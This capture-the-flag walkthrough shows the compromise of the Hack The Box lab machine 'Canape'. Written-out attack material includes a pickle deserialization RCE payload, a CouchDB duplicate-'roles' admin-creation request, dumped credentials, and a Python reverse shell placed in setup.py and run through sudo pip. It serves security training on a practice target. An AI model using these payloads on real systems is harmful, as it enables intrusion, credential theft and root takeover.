# Hackthebox Writeup / Walkthrough for Canape
## Enumeration and User Flag
As always, we will start with enumeration.  We will use nmap to see what services are open.
```bash
# -sC runs default NSE scripts
# -sV prints out service information
# -oA outputs the results in all formats to the specified directory with the specified prefix (the nmap directory with a prefix of canape)
# 10.10.10.70 is the target IP

root@kali:~/ctf/hackthebox/canape# nmap -sC -sV -oA nmap/canape 10.10.10.70
Starting Nmap 7.70 ( https://nmap.org ) at 2018-08-23 18:45 EDT
Nmap scan report for 10.10.10.70
Host is up (0.029s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-git: 
|   10.10.10.70:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|     Last commit message: final # Please enter the commit message for your changes. Li...
|     Remotes:
|_      http://git.canape.htb/simpsons.git
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Simpsons Fan Site
|_http-trane-info: Problem with XML parsing of /evox/about

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.50 seconds
```

Before we look at the git repository, let's take a look at the site that is hosted:

![web site](screenshots/1_website.png)

After poking around, there are no obvious vulnerabilities.

Let's take a look at the git repository that nmap found for us:

![git repository](screenshots/2_.git_listing.PNG)

To make it easier to work with, we will mirror it to our local box using wget:
```bash
# --reject="index.html*" - do not download the automatically generated index.html files
# --recursive - download files recursively
# --no-parent - Only download files from the base directory and below (do not try to go to the parent)
# -nH do not generate a directory structure starting with the hostname (in this case, it will start with .git)

wget --reject="index.html*" --recursive --no-parent -nH http://10.10.10.70/.git/
```

Using ```git status```, we can see if there are any uncommitted changes.  Let's take a look:
![git status](screenshots/3_git_status.PNG)

We can see that a file called __init__.py was deleted.  The rest of the files may be interesting as well.
To restore them, we can use ```git checkout``` or ```git reset```:
```bash
# git checkout is fine for single files
git checkout -- <file name>

# Example
git checkout -- __init__.py

# We can also reset the state of the repository to before the commit with the deletions was made:
# --hard discards any changes to files that git is tracking (files that are part of the repository)
git reset --hard
```

After examining ```__init__.py```, this appears to be an application that uses Flask.  Flask is a Python
framework for serving resources over the web (API endpoints, web pages, et cetera).

It looks like this is the source code to the side we looked at first.  The ```/submit``` and check endpoints are interesting:
```python
 34 WHITELIST = [
 35     "homer",
 36     "marge",
 37     "bart",
 38     "lisa",
 39     "maggie",
 40     "moe",
 41     "carl",
 42     "krusty"
 43 ]
 44
 45 @app.route("/submit", methods=["GET", "POST"])
 46 def submit():
 47     error = None
 48     success = None
 49 
 50     if request.method == "POST":
 51         try:
 52             char = request.form["character"]
 53             quote = request.form["quote"]
 54             if not char or not quote:
 55                 error = True
 56             elif not any(c.lower() in char.lower() for c in WHITELIST):
 57                 error = True
 58             else:
 59                 # TODO - Pickle into dictionary instead, `check` is ready
 60                 p_id = md5(char + quote).hexdigest()
 61                 outfile = open("/tmp/" + p_id + ".p", "wb")
 62                 outfile.write(char + quote)
 63                 outfile.close()
 64                 success = True
 65         except Exception as ex:
 66             error = True
 67 
 68     return render_template("submit.html", error=error, success=success)
 69
 70 @app.route("/check", methods=["POST"])
 71 def check():
 72     path = "/tmp/" + request.form["id"] + ".p"
 73     data = open(path, "rb").read()
 74 
 75     if "p1" in data:
 76         item = cPickle.loads(data)
 77     else:
 78         item = data
 79 
 80     return "Still reviewing: " + item

```
Line 76 is very interesting because it uses a concept in Python called pickling.  Pickling is a method for serializing and deserializing objects.
In case you are not familiar, serializing an object means to take an object (a collection of properties and methods) and represent it as something that
can be easily transmitted and reconstructed.  For things like strings and numbers, it is not necessary, but if you have something more complex, serialization is a helpful tool.

To see how we can use that to our advantage here, let's take a look at what the code does.  The submit function maps to this page:
![submit page](screenshots/3.5_submit_page.png)

Let's take a look at what happens when a visitor hits submit:
```python
 52             char = request.form["character"]
 53             quote = request.form["quote"]
 54             if not char or not quote:
 55                 error = True
 56             elif not any(c.lower() in char.lower() for c in WHITELIST):
 57                 error = True
 58             else:
 59                 # TODO - Pickle into dictionary instead, `check` is ready
 60                 p_id = md5(char + quote).hexdigest()
 61                 outfile = open("/tmp/" + p_id + ".p", "wb")
 62                 outfile.write(char + quote)
 63                 outfile.close()
 64                 success = True
```
Line 54 makes sure both fields have data in them.  Line 56 makes sure that the Character field contains a string from the whitelist which is defined at line 34 (see above).
If both form fields are not empty and the character field contains the name of a character from the whitelist, the code does the following:

  1.  Generate the MD5 hash of the two fields concatenated together
  2.  Output a file in /tmp named <hash from step 1>.p
  

The check function loads a file with the MD5 hash specified in the ```id``` form parameter.  If the file exists, and contains the string ```"p1"```, the data is deserialized (line 76).

```"p1"``` is output when Python pickles an object.  Seems relatively straight forward.  This is where the vulnerability is though.  You have to be careful about deserializing objects that come from untrusted places.  If an attacker can deserialize an object he controls, that could lead to remote code execution<sup>[1]</sup>.  That is exactly what we have here.  We can control the data that gets unpickled by submitting a character that contains a pickled object that runs a command of our choice when unpickled.  We will use the character field because it is the first one that is written (and will therefore be the first one read back in).  This will make sure that our pickled data is executed before anything else.

The code does not validate or sanitize what we input except to make sure the character field has the name of a Simpsons character from the whitelist in it.  Our pickled object will look like this:
```python
# The object to pickle
class Runner(object):
    # The __reduce__ function determines how an object is pickled.  It is called every time we pickle or unpickle the object.
    def __reduce__(self):
        # shlex.split allows us to provide commands with arguments (like ls -l)
        # it splits the command into the program (first item) and its arguments (subsequent items)
        # This is how subprocess is expecting the command
        # command is a global variable not shown here (see the full code)
        return (subprocess.check_output, (shlex.split(command), ))
```
When this class is unpickled, it will run the command that we specify.  This class is part of a larger piece of code that takes the command we want to execute, packages it up, sends it, and displays the result.  The full code is [here](code/commander.py).

Using the code, we will try a few basic things like grab the list of users on the box by looking at ```/etc/passwd```:

![passwd file](screenshots/4_etcpasswd.PNG)

Here are the users other than root that have a login shell.  This may be useful later.
```
homer:x:1000:1000:homer,,,:/home/homer:/bin/bash
git:x:998:998::/var/opt/gitlab:/bin/sh
gitlab-psql:x:996:996::/var/opt/gitlab/postgresql:/bin/sh
gitlab-prometheus:x:995:995::/var/opt/gitlab/prometheus:/bin/sh
```

We can also look at running processes:
![ps](screenshots/7_ps.PNG)

The homer user is running CouchDB (process ID 720).  It seems to suggest that version 2.0.0 is running.  We will talk more about CouchDB in a moment.

Another thing we can look at is open ports on the box.  There may be services running that are not visible from the outside.  We can do this using the ```ss``` command:
![open ports](screenshots/5_open_ports.PNG)
We can see that there are several services running that are only listening on the loopback interface so we need to get better access to the box in order to poke at them more.  They are running on ports 5984 and 5986.

There are also ports that are listening on all interfaces that we did not see in our initial nmap scan: 4369, 37048, and 65535.  Let's use nmap to scan these ports:

![nmap scan round 2](screenshots/6_nmap_new_ports.PNG)

4369 and 37048 are filtered, but ssh looks to be running on port 65535.  That will probably come in handy later.  For now, we will focus on ports 5984 and 5986.  They are used by CouchDB.  CouchDB is a NoSQL database and as such stores data in documents instead of tables, rows, and columns like a relational database.  Port 5984 is used for most interactions with a CouchDB server.  According to the documentation<sup>[2]</sup>, port 5986 is a “Backend” interface "used for specific cluster admin tasks. Of interest are the _nodes and _dbs databases visible only through this interface."

After looking into this for a bit, I came across a page<sup>[3]</sup> that talks about how to create admin users in CouchDB in versions older than 2.1 (we are working with 2.0.0 according to the ps output above, so the vulnerability will likely work for us).  Essentially, CouchDB used two different JSON parsers: the Javascript parser used for validation and the internal one used by CouchDB (called jiffy).  When given duplicate records, the Javascript parser will only store the second duplicate.  Jiffy will return the first one.  That means we can create an admin by passing a JSON record with two "roles" fields.  The "roles" field is used to define what roles a user will have.  The first roles field will contain the role we want (_admin).  The second roles field will contain nothing.  The second roles field will pass the validation that the Javascript JSON parser does to make sure we are assigning roles we are allowed to.  The first role field will be read by Jiffy and assigned to our user.

We can run the following command through our script to create the admin user:
```bash
# -H sets the specified header.  CouchDB takes JSON as input for new records.
# -X PUT tells curl to use PUT as the HTTP method.  We need to PUT to get data into the database
# To specify a user, we will give it a name (bartman in this case), assign bartman the role of admin (_admin) with a password of password.
# The last argument is the URL.  /_users/org.couchdb.user is the user database
curl -H 'Content-Type: application/json' -X PUT -d '{"type": "user", "name": "bartman", "roles": ["_admin"], "roles": [], "password": "password"}' http://localhost:5984/_users/org.couchdb.user:bartman
```
![create CouchDB user](screenshots/8_create_couchdb_user.PNG)

We got an "ok" base from the server which means we can start enumerating the database.  I used the following page<sup>[4]</sup> as a reference.  We can use our handy script to execute all of these commands.  We will execute all of the commands as the bartman user we created above.

```bash
# Enumerate all databases
curl http://bartman:password@localhost:5984/_all_dbs

["_global_changes","_metadata","_replicator","_users","passwords","simpsons"]
```

The passwords database sounds interesting.  Let's enumerate it:
```bash
# Pull all documents from the passwords database
curl http://bartman:password@localhost:5984/passwords/_all_docs
```
```json
{"total_rows":4,"offset":0,"rows":[
{"id":"739c5ebdf3f7a001bebb8fc4380019e4","key":"739c5ebdf3f7a001bebb8fc4380019e4","value":{"rev":"2-81cf17b971d9229c54be92eeee723296"}},
{"id":"739c5ebdf3f7a001bebb8fc43800368d","key":"739c5ebdf3f7a001bebb8fc43800368d","value":{"rev":"2-43f8db6aa3b51643c9a0e21cacd92c6e"}},
{"id":"739c5ebdf3f7a001bebb8fc438003e5f","key":"739c5ebdf3f7a001bebb8fc438003e5f","value":{"rev":"1-77cd0af093b96943ecb42c2e5358fe61"}},
{"id":"739c5ebdf3f7a001bebb8fc438004738","key":"739c5ebdf3f7a001bebb8fc438004738","value":{"rev":"1-49a20010e64044ee7571b8c1b902cf8c"}}
]}
```

For each of these keys, we need to grab each document:
```bash
curl http://bartman:password@localhost:5984/passwords/<Document ID>
```

Here is the output:
```
curl http://bartman:password@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc4380019e4
{"_id":"739c5ebdf3f7a001bebb8fc4380019e4","_rev":"2-81cf17b971d9229c54be92eeee723296","item":"ssh","password":"0B4jyA0xtytZi7esBNGp","user":""}

curl http://bartman:password@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc43800368d
{"_id":"739c5ebdf3f7a001bebb8fc43800368d","_rev":"2-43f8db6aa3b51643c9a0e21cacd92c6e","item":"couchdb","password":"r3lax0Nth3C0UCH","user":"couchy"}

curl http://bartman:password@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc438003e5f
{"_id":"739c5ebdf3f7a001bebb8fc438003e5f","_rev":"1-77cd0af093b96943ecb42c2e5358fe61","item":"simpsonsfanclub.com","password":"h02ddjdj2k2k2","user":"homer"}

curl http://bartman:password@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc438004738
{"_id":"739c5ebdf3f7a001bebb8fc438004738","_rev":"1-49a20010e64044ee7571b8c1b902cf8c","user":"homerj0121","item":"github","password":"STOP STORING YOUR PASSWORDS HERE -Admin"}
```

Looks like we have a possible SSH password for homer (the one in document 739c5ebdf3f7a001bebb8fc4380019e4): ```0B4jyA0xtytZi7esBNGp```.  I am making the leap that this is homer's password because the two of the other entries seem to belong to him.  We can try it:
```bash
ssh homer@10.10.10.70 -p 65535
```

![SSH as homer](screenshots/10_ssh_as_homer.PNG)

The user flag is in the home directory:
![user flag](screenshots/11_user_flag.PNG)

## Root Flag
One of the first things I do once I get user access is to see if the user can sudo and what commands they can run.  We can do this with the following command:
```bash
sudo -l
```
![sudo commands](screenshots/12_homer_sudo_commands.PNG)

It looks like homer can run /usr/bin/pip and install whatever modules he wants.  At first, this does not seem like a way to get command execution.  Fortunately for us, when pip install runs, it executes setup.py, so all we need is a reverse shell in a file called setup.py:
```python

# Import necessary libraries
import socket,subprocess,os

# Set up a socket that we can send and receive data through
# AF_INET is IPv4, SOCK_STREAM is TCP.  You could use socket.SOCK_DGRAM for UDP.
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

# Connect to our machine on port 44551
s.connect(("YOUR_IP",SOME_PORT))

# dup2 copies the first file descriptor to the second file descriptor.
# In the next three lines, we are duplicating the socket's file descriptor to standard input, standard output, and standard error respectively
# This sends the data to / from those streams through the socket
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)

# Spawn /bin/sh.  Since the standard input streams are duplicated to the socket, we can interact with this shell
p=subprocess.call(["/bin/sh","-i"]);'
```

This shell should do nicely.  Now we need to install it.  Let's try it:

```bash
# -e allows us to install from a local path (in this case, the current directory, .)
sudo pip install -e . setup.py
```

Looks like it worked.  The root flag is in root's home directory.

![root flag](screenshots/14_root_flag.PNG)

## References
[1]: https://blog.nelhage.com/2011/03/exploiting-pickle/ "Exploiting Pickle"
[2]: http://docs.couchdb.org/en/stable/whatsnew/2.0.html?highlight=5986.html "CouchDB Documentation"
[3]: https://justi.cz/security/2017/11/14/couchdb-rce-npm.html "Remote Code Execution in CouchDB"
[4]: https://www.1and1.com/cloud-community/learn/database/couchdb/working-with-couchdb-from-the-command-line/ "Working With CouchDB from the Command Line"

  * [<sup>1</sup> Exploiting Pickle](https://blog.nelhage.com/2011/03/exploiting-pickle/)
  * [<sup>2</sup> CouchDB Documentation](http://docs.couchdb.org/en/stable/whatsnew/2.0.html?highlight=5986.html)
  * [<sup>3</sup> Remote Code Execution in CouchDB](https://justi.cz/security/2017/11/14/couchdb-rce-npm.html)
  * [<sup>4</sup> Working With CouchDB from the Command Line](https://www.1and1.com/cloud-community/learn/database/couchdb/working-with-couchdb-from-the-command-line/)
